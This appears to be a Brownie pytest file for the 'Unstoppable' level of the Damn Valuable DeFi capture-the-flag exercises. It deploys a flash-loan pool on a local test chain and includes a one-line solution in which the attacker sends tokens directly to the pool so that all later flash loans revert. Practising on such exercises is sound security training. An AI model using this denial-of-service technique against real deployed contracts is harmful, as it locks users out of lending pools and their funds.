import pytest
import brownie
from brownie import DamnValuableToken, UnstoppableLender, ReceiverUnstoppable
from brownie import accounts , Wei , exceptions

deployer, attacker, someUser = None, None, None

TOKENS_IN_POOL = Wei('1_000_000 ether')           # Pool has 1M * 10**18 tokens
INITIAL_ATTACKER_TOKEN_BALANCE = Wei('100 ether') # Attacker has 100* 10**18 tokens

@pytest.fixture(scope="module")
def contracts():
    #-- SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE --#
    global deployer, attacker, someUser 
    deployer, attacker, someUser = accounts[0] ,accounts[1] ,accounts[2]

    contracts = {}

    token =  DamnValuableToken.deploy( {"from":deployer} )
    pool = UnstoppableLender.deploy( token.address, {"from":deployer} )

    # Funding Pool with initial DVT tokens
    token.approve(pool.address, TOKENS_IN_POOL, {"from":deployer} )
    pool.depositTokens(TOKENS_IN_POOL, {"from":deployer} )

    # Funding Attacker with initial DVT tokens
    token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE, {"from":deployer})

    assert token.balanceOf(pool.address) == TOKENS_IN_POOL
    assert token.balanceOf(attacker.address) == INITIAL_ATTACKER_TOKEN_BALANCE

    # Show it's possible for someUser to take out a flash loan
    receiverContract = ReceiverUnstoppable.deploy(pool.address , {"from":someUser})
    receiverContract.executeFlashLoan(10, {"from":someUser})

    contracts['token'] = token
    contracts['pool'] = pool
    contracts['receiverContract'] = receiverContract

    yield contracts

    #--******** SUCCESS CONDITIONS ********--#
    # It is no longer possible to execute flash loans
    with brownie.reverts():
        contracts['receiverContract'].executeFlashLoan(10, {'from': someUser})
 
def test_unstoppable_exploit(contracts):
    #--*** CODE YOUR EXPLOIT HERE ***--#
    contracts['token'].transfer(contracts['pool'].address, INITIAL_ATTACKER_TOKEN_BALANCE, {'from':attacker})
    #--*** ________xxx____________ ***--#